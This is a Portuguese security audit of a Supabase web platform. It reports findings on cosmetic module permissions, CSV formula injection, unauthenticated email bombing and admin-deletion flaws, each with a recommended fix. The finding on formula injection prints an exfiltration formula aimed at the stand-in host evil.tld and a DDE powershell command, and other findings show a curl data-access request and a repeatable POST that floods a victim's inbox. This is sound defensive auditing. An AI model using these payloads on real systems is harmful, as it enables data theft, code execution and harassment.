SUMÁRIO EXECUTIVO
--------------------------------------------------------------------------------
A plataforma está, em fundamentos, ACIMA da média do mercado para um produto
deste porte. As três coisas que mais derrubam sistemas Supabase — tabela sem RLS,
segredo no bundle e XSS — não existem aqui:

  • 120 de 120 tabelas do schema public com RLS habilitada. ZERO exceções.
  • ZERO segredos hardcoded no repositório ou no bundle do frontend.
  • ZERO ocorrências de dangerouslySetInnerHTML, innerHTML, eval ou new Function.
  • Auto-escalação de cargo bloqueada por trigger no banco (não só por policy).
  • Formulários públicos com WITH CHECK restritivo e rate-limit próprio.
  • Chaves de API de terceiros (Google, Resend, D4Sign) nunca chegam ao navegador.

As auditorias anteriores (23/07, 2ª auditoria, 08/08, 15/08, 18/08) fecharam
buracos reais e as correções estão VERIFICADAS em produção. Isto aqui não é uma
repetição delas — são achados novos.

O que esta auditoria encontrou de novo se concentra em três eixos:

  1. CONTROLE DE ACESSO QUE SÓ EXISTE NO NAVEGADOR. O recurso "Acesso por
     módulo" (Configurações → Usuários) não tem NENHUMA contraparte no banco.
     Zero policies RLS chamam current_user_has_module(). Um admin que revoga um
     módulo acredita ter revogado o dado — não revogou nada.

  2. SUPERFÍCIE FORA DO GIT. Três Edge Functions rodam em produção e NUNCA
     foram commitadas. Uma delas (sanwey-crm-mcp) roda com service_role,
     verify_jwt=false, e lê o banco inteiro. Outra (analyze-lead) é órfã, sem
     checagem de cargo, e continua ATIVA queimando a chave Anthropic da empresa.

  3. O ANÔNIMO DA INTERNET ALCANÇA O DESKTOP DO FUNCIONÁRIO. Os formulários
     públicos gravam texto livre que 16 telas exportam para CSV sem neutralizar
     fórmula. Um atacante sem login escreve =HYPERLINK(...) no nome do cliente e
     isso executa quando alguém do time abre o CSV no Excel.

[AC-01] "Acesso por módulo" e o interruptor global de módulo NÃO existem no
        banco — o controle é 100% cosmético (Broken Access Control, OWASP A01)
--------------------------------------------------------------------------------
Severidade.: ALTO-CRÍTICO
Local......: src/App.jsx:1702  (único ponto de bloqueio)
             src/utils/module-access.js:7  (comentário promete espelho em SQL)
             supabase/migrations/20260924_module_states_espelha_modulos_novos.sql:6
Confirmado : em produção, via consulta a pg_policy.

EVIDÊNCIA (consulta ao banco de produção):
  SELECT ... FROM pg_policy WHERE qual ILIKE '%current_user_has_module%'
     → 0 linhas.

A própria migration 20260924 já registra isso por escrito:
  "Nenhuma policy RLS chama current_user_has_module() hoje (conferido: 0 ...)"
— mas o achado foi tratado como nota de rodapé, não como falha de segurança.

O ÚNICO bloqueio hoje é este, no navegador:
  App.jsx:1702
  if (!isAgencia && !isPortalOnly && ALL_MODULE_IDS.includes(section)
      && !allowedModules.has(section)) { ... redireciona ... }

IMPACTO:
A tela Configurações → Usuários apresenta "Acesso por módulo" como um controle
de permissão real. Um admin usa isso para, por exemplo, tirar de um vendedor o
acesso a "RH → Funcionários" (salários, CPF, contratos) ou a "Clientes". O
usuário continua com a sessão válida e o cargo intacto — e a RLS decide pelo
CARGO, não pelo módulo. Logo:

  - O redirecionamento do App.jsx é um `if` em JavaScript. Some com ele nas
    DevTools, ou simplesmente ignore a UI.
  - Não é preciso nem isso: com o token da própria sessão, um GET direto no
    PostgREST devolve o dado, porque nenhuma policy conhece o conceito de módulo:
      curl "$SUPABASE_URL/rest/v1/rh_colaboradores?select=*" \
           -H "apikey: <anon>" -H "Authorization: Bearer <JWT do próprio usuário>"
  - O mesmo vale para o interruptor GLOBAL de módulo (module_states,
    migration 20260923): desligar um módulo "para todo mundo" não fecha a porta
    de dados, só some o item do menu.

Isto é mais grave que uma permissão faltando, porque cria uma FALSA GARANTIA:
o admin acredita que revogou acesso e para de monitorar aquele usuário.

CORREÇÃO RECOMENDADA:
  a) Escolher UMA das duas posturas e ser explícito na UI:
     (i) Transformar em controle real: adicionar
         `AND current_user_has_module('<modulo>')` ao predicado de SELECT das
         tabelas de cada módulo. A função já existe e já lê os overrides —
         falta só ser chamada. Comece pelos módulos que carregam dado sensível:
         rh_colaboradores, rh_avaliacoes, rh_movimentacoes, clients, leads,
         marketing_expenses, crm_viagem_prestacoes.
     (ii) Se a decisão for manter só como navegação (é uma decisão legítima —
         menos policies, menos risco de quebrar), então RENOMEAR o rótulo na UI
         de "Acesso por módulo" para "Itens de menu visíveis" e escrever ali,
         no próprio card, que isso não restringe dados.
  b) Registrar a decisão no CLAUDE.md — hoje o comentário em module-access.js:7
     diz "O espelho em SQL fica em current_user_has_module()", o que induz quem
     lê a acreditar que a proteção existe.
  c) Isto é mudança de schema/RLS → exige confirmação explícita do Daniel
     (regra 5) e passagem pelo security-agent (regra 3.1).

[AL-01] Injeção de fórmula em CSV a partir de formulário público —
        anônimo da internet executa comando no Excel do funcionário
--------------------------------------------------------------------------------
Severidade.: ALTO
Local......: src/utils/export-csv.js:22-29  (csvCell — não neutraliza fórmula)
             src/utils/export-csv.js:91     (l.company entra cru no CSV)
             16 telas com "Exportar CSV" (regra 1 do CLAUDE.md)
Entrada....: rota pública /captura/:slug → RPC submit_lead_capture
             (também /solicitar-marketing, /vagas/:slug, /trabalhe-conosco,
              /pesquisa/:id — todas sem login)

CÓDIGO ATUAL (export-csv.js:22):
  export function csvCell(v) {
    if (v === null || v === undefined) return "";
    const s = String(v);
    if (s.includes(";") || s.includes("\"") || s.includes("\n") || s.includes("\r")) {
      return `"${s.replace(/"/g, "\"\"")}"`;
    }
    return s;
  }

O tratamento cobre delimitador, aspas e quebra de linha — está correto para
PARSING. Não cobre nada para EXECUÇÃO: `=`, `+`, `-`, `@`, TAB e CR no início da
célula continuam intactos, e é exatamente isso que o Excel/LibreOffice/Google
Sheets interpretam como fórmula ao abrir o arquivo.

CADEIA DE ATAQUE COMPLETA (sem nenhuma credencial):
  1. Atacante abre https://<app>/captura/<slug> — página pública, sem login.
  2. Preenche "Nome do cliente" com:
       =HYPERLINK("https://evil.tld/?x="&A1&B1,"Clique para ver a proposta")
     ou, em ambiente Windows com DDE habilitado, a variante clássica
       =cmd|'/c powershell -w hidden ...'!A1
  3. submit_lead_capture grava isso em `leads.company`
     (verificado: `company` recebe `btrim(p_customer_name)` sem sanitização —
      e não deveria mesmo sanitizar ali, o problema é na saída).
  4. Um vendedor/gerente clica "Exportar CSV" no Funil de Vendas.
  5. export-csv.js:91 escreve `l.company` cru na coluna.
  6. O funcionário abre o arquivo. O Excel avalia a fórmula.

O impacto vai de exfiltração silenciosa do conteúdo da planilha inteira
(a base de leads exportada, com CNPJ, valores e tomador de decisão) até
execução de comando, dependendo da configuração do Office da máquina.

O ponto que torna isso ALTO e não MÉDIO: a origem é ANÔNIMA e REMOTA (formulário
público na internet), o alvo é o desktop corporativo, e as 16 telas de export
compartilham a MESMA função — então uma correção de 4 linhas fecha todas.

CORREÇÃO RECOMENDADA (uma função, cobre os 16 boards):
  export function csvCell(v) {
    if (v === null || v === undefined) return "";
    let s = String(v);
    // Neutraliza injeção de fórmula: prefixo de apóstrofo faz o Excel tratar
    // como texto. Cobre =, +, -, @, TAB e CR no início da célula (OWASP CSV
    // Injection). Não altera o valor exibido na planilha.
    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
    if (s.includes(";") || s.includes('"') || s.includes("\n") || s.includes("\r")) {
      return `"${s.replace(/"/g, '""')}"`;
    }
    return s;
  }
  Observação: aplicar DEPOIS do prefixo e ANTES do encapsulamento, como acima.
  Isto NÃO é mudança visual/estrutural (regra 3) — é correção de bug de
  segurança na serialização, não precisa de mockup.

[AL-02] Bombardeio de e-mail de terceiro, sem autenticação, a partir do
        domínio @sanwey.com.br
--------------------------------------------------------------------------------
Severidade.: ALTO
Local......: supabase/functions/rh-send-email/index.ts:769-771
             (rota pública "candidatura_recebida", sem gate de JWT)
             + RPC pública submit_job_application

CADEIA DE ATAQUE (sem nenhuma credencial):
  1. Atacante escolhe uma vaga publicada — o slug é público por definição
     (/vagas/:slug).
  2. Chama submit_job_application com o E-MAIL DA VÍTIMA (nome/telefone podem
     ser inventados; a função só valida formato). A função devolve o
     `candidate_id` (UUID real da vítima no banco).
  3. Chama repetidamente, em laço:
       POST /functions/v1/rh-send-email
       { "type": "candidatura_recebida",
         "vagaSlug": "<slug público>",
         "candidateId": "<uuid devolvido no passo 2>" }
  4. Cada chamada dispara um e-mail real, via Resend, de noreply@sanwey.com.br
     para a vítima. Não há dedupe, não há limite de taxa, não há JWT.

O handler em si está BEM FEITO — resolve o destinatário a partir do registro
(handlePublicCandidaturaRecebida:766, `to: candidato.email`), nunca do body, o
que impede relay aberto para endereço arbitrário. O furo não é o destinatário:
é a ausência de qualquer limite na REPETIÇÃO, somada ao fato de que o atacante
consegue plantar o e-mail da vítima no banco no passo 2.

IMPACTO:
  - Assédio/bombardeio de uma pessoa específica, com o domínio da Sanwey como
    remetente. Reputação de domínio (SPF/DKIM já corretos não protegem contra
    volume) — bounce rate e denúncias de spam derrubam a entregabilidade de
    TODOS os e-mails transacionais da plataforma, inclusive convites e
    recuperação de senha.
  - Queima da cota da conta Resend.
  - O mesmo padrão vale, em menor grau, para "bemestar_confirmado"
    (rh-send-email:772) — ali o agendamentoId é um UUID não devolvido ao
    atacante, então só permite auto-spam.

CORREÇÃO RECOMENDADA:
  a) Rate-limit no próprio registro, no mesmo espírito dos contadores já usados
     nas RPCs públicas: antes de enviar, contar quantos e-mails
     `candidatura_recebida` já saíram para aquele candidate_id (ou para aquele
     par candidato+vaga) nas últimas 24h; acima de 1-2, devolver o `noop()` que
     a função já tem. Isso exige uma coluna/tabela de registro de envio →
     mudança de schema, confirmação do Daniel (regra 5).
  b) Alternativa sem schema novo: usar `rh_aplicacoes.updated_at` como âncora —
     só enviar se a aplicação foi criada/atualizada nos últimos N minutos e
     ainda não tiver marca de envio.
  c) Independente disso: limite de taxa por IP na borda. A Supabase não oferece
     isso nativamente por function — considerar colocar as rotas públicas atrás
     do Netlify (proxy /api/*) onde há rate limiting.

[AL-04] `delete-user`: gerente de Marketing/RH pode apagar QUALQUER conta,
        inclusive a do admin, e de qualquer empresa
--------------------------------------------------------------------------------
Severidade.: ALTO
Local......: supabase/functions/delete-user/index.ts:53-57

CÓDIGO ATUAL:
  if (!profile || !profileRoles.some((r) =>
      ["admin", "gerente", "gerente_marketing", "gerente_rh"].includes(r))) {
    return ... 403 ...
  }
  ...
  if (user_id === userData.user.id) { ... 400 "não pode remover a própria" ... }

A ÚNICA proteção após o 403 é impedir a auto-exclusão. Falta tudo o mais:

  - NÃO verifica o cargo do ALVO. Um `gerente_marketing` apaga a conta do
    `admin` — profile + linha em auth.users, irreversível pela UI.
  - NÃO verifica a empresa do alvo. Um gerente da Resibag apaga usuários da
    Sanwey Indústria e da Monte Mor.
  - É mais permissivo que a própria RLS da tabela: a policy `profiles_delete`
    em produção exige
      `current_user_is_admin() OR (current_user_is_manager()
       AND role <> 'admin' AND companies && current_user_companies())`
    — ou seja, o banco protege, mas a edge function roda com service_role e
    BYPASSA essa policy inteira. A função é literalmente uma porta lateral que
    contorna a proteção que já existe no banco.

IMPACTO: escalonamento lateral com destruição. Um gerente de Marketing
descontente (ou uma conta de gerente comprometida por phishing) apaga a
diretoria e trava a administração da plataforma.

CORREÇÃO RECOMENDADA (delete-user/index.ts, após o 403 atual):
  1. Buscar o perfil do ALVO: `.select("role, roles, companies").eq("id", user_id)`.
  2. Se `alvo.roles` contém 'admin' e o chamador NÃO é admin → 403.
  3. Se o chamador não é admin, exigir interseção de empresas:
     `alvo.companies && chamador.companies` → senão 403.
  4. Restringir o conjunto de cargos que podem excluir: hoje
     `gerente_marketing`/`gerente_rh` excluem contas de qualquer área. Avaliar
     com o Daniel se isso deve virar só `admin` + `gerente`.
  5. Espelhar exatamente o predicado de `profiles_delete` (regra 3.1: "policy
     nova compara com o predicado já em produção") — aqui é o inverso: a
     function é que precisa se alinhar à policy.

[AL-06] Checagem de "não é admin" usa a coluna escalar `role` e ignora
        `roles[]` — gerente consegue rebaixar e apagar um admin
--------------------------------------------------------------------------------
Severidade.: ALTO
Local......: policies em produção — `profiles_delete`, `profiles_update`,
             `invitations_admin_update`, `invitations_admin_delete`

PREDICADOS EM PRODUÇÃO (verificados via pg_policy):
  profiles_delete  USING:
    current_user_is_admin()
    OR (current_user_is_manager() AND role <> 'admin'
        AND companies && current_user_companies())

  profiles_update  USING:  ... AND role <> 'admin' ...
                   WITH CHECK: ... AND role <> 'admin'
                               AND NOT ('admin' = ANY(COALESCE(roles,'{}'))) ...

O WITH CHECK do UPDATE já foi corrigido para olhar `roles[]`. O USING, não.
E o `profiles_delete` também não.

A plataforma inteira migrou de cargo escalar para multi-cargo (`roles[]`) — o
CLAUDE.md documenta isso, e o trigger `profiles_sync_roles` garante
`role ∈ roles`. Mas a recíproca é FALSA: um usuário pode ter
`role = 'gerente'` e `roles = ['gerente','admin']`. Para esse usuário,
`role <> 'admin'` é VERDADEIRO.

CONSEQUÊNCIA:
  - Um `gerente` da mesma empresa passa no USING de `profiles_delete` e
    APAGA um administrador cujo admin é cargo adicional.
  - No `profiles_update`, o USING deixa entrar; o WITH CHECK impede que a linha
    CONTINUE com admin — o que na prática significa que o gerente pode
    REMOVER o cargo de admin da pessoa (rebaixamento forçado), e não que está
    protegido.
  - Mesmo padrão em `invitations_admin_update` / `invitations_admin_delete`:
    um gerente mexe num convite de admin desde que o campo escalar `role` do
    convite não seja literalmente 'admin'.

IMPACTO: perda de controle administrativo da plataforma por um cargo que não
deveria ter esse poder. É o inverso do self-escalation (que ESTÁ bloqueado, ver
seção de pontos fortes): aqui é rebaixamento/eliminação lateral do superior.

CORREÇÃO RECOMENDADA:
  Trocar toda ocorrência de `role <> 'admin'` por
    `NOT ('admin' = ANY(COALESCE(roles, '{}'::text[])))`
  nas 4 policies acima. É a mesma expressão que o WITH CHECK de
  `profiles_update` já usa — basta propagar. Migration nova → confirmação
  explícita do Daniel (regra 5) + security-agent (regra 3.1) + `get_advisors`
  depois de aplicar.
